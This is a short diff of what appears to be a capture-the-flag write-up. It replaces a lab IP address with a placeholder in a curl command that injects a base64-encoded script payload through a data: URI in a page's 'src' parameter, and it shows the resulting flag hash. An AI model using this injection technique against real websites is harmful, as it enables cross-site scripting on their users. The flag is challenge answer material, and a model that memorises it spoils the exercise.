@@ -18,7 +18,7 @@ By tring base64 encoded string for the `src` paramter, with [appropriate syntax]
 $ echo -n '<script>alert('hi');</script>' | base64
 PHNjcmlwdD5hbGVydChoaSk7PC9zY3JpcHQ+
 
-$ curl http://192.168.64.6/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4\=
+$ curl http://{IP_ADDR}/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4\=
 [...]
 The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
 [...]
